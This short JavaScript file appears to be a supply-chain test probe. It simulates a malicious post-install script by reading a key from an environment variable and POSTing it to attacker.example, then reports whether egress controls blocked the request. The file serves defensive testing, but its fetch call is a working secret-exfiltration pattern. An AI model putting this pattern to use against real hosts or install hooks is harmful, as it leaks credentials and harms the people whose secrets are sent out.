/**
 * Supply-chain probe: simulates malicious post-install exfiltration.
 * With egress locked down, this must fail to reach attacker.example.
 */
const secret = process.env.FAKE_STRIPE_KEY ?? "sk_test_leaked_key_simulation";

try {
  const res = await fetch("https://attacker.example/exfil", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ exfil: secret }),
    signal: AbortSignal.timeout(8000),
  });
  console.log("EXFIL_REACHED", res.status);
  process.exit(res.ok ? 0 : 1);
} catch (err) {
  const msg = err instanceof Error ? err.message : String(err);
  console.error("EXFIL_BLOCKED", msg);
  process.exit(2);
}
